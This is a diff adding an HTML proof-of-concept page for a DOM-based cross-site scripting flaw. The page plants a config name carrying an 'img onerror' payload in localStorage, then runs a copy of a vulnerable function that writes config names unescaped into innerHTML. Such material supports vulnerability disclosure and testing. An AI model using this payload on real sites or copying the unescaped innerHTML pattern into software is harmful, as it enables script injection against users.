@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DOM XSS PoC</title>
+</head>
+<body>
+    <h1>DOM XSS Proof of Concept</h1>
+    <button onclick="injectMaliciousConfig()">Inject Malicious Config</button>
+    <button onclick="simulateVulnerablePage()">Simulate Vulnerable Page</button>
+
+    <div id="saved-configs"></div>
+    <p id="no-saved-configs-msg">No saved configurations available.</p>
+
+    <script>
+        function injectMaliciousConfig() {
+            // Define a malicious config object with XSS payload
+            let maliciousConfig = {
+                // Benign config entry for comparison
+                "safeEntry": {
+                    "email": "user@example.com",
+                    "envType": "production",
+                    "env": "safeEnv",
+                    "standardPass": false
+                },
+                // Malicious entry with XSS payload in configName
+                '"><img src=x onerror=alert("XSS Vulnerability!")>': {
+                    "email": "attacker@example.com",
+                    "envType": "testing",
+                    "env": "maliciousEnv",
+                    "standardPass": false
+                }
+            };
+
+            // Store the malicious config in localStorage
+            localStorage.setItem("martiniConfigs", JSON.stringify(maliciousConfig));
+            alert("Malicious config injected into localStorage. Click 'Simulate Vulnerable Page' to test.");
+        }
+
+        function simulateVulnerablePage() {
+            // Function simulating the vulnerable code, including createQuickButtons()
+
+            function getConfig() {
+                return JSON.parse(localStorage.getItem("martiniConfigs")) || {};
+            }
+
+            function createQuickButtons() {
+                var configs = getConfig();
+                var container = document.getElementById("saved-configs");
+                container.innerHTML = ""; // Clear previous content
+                var hasConfigs = false;
+
+                // Generate buttons based on config names
+                for (var configName in configs) {
+                    var btn = document.createElement("div");
+                    btn.innerHTML = `
+                        <article class="card pointer" onclick="fillForm('${configName}')">
+                            <section class="card_content card_content-compressed l-flex-between">
+                                <div>
+                                    <strong class="card_title" title="This is a Title">${configName}</strong>
+                                </div>
+                                <div>
+                                    <button type="button" class="btn btn-minor" title="Edit" onclick="fillForm('${configName}', true); event.stopPropagation()">Edit</button>
+                                    <button type="button" class="btn btn-icon btn-minor" title="Delete" onclick="removeConfiguration('${configName}'); event.stopPropagation()">
+                                        <i class="icon icon-trash"></i>
+                                        <span class="vh">Delete</span>
+                                    </button>
+                                </div>
+                            </section>
+                        </article>
+                    `;
+                    container.appendChild(btn);
+                    hasConfigs = true;
+                }
+
+                var zeroStateEl = document.getElementById("no-saved-configs-msg");
+                if (zeroStateEl && hasConfigs) {
+                    zeroStateEl.classList.add("u-display-none");
+                } else if (zeroStateEl) {
+                    zeroStateEl.classList.remove("u-display-none");
+                }
+            }
+
+            // Call the vulnerable function
+            createQuickButtons();
+        }
+    </script>
+</body>
+</html>
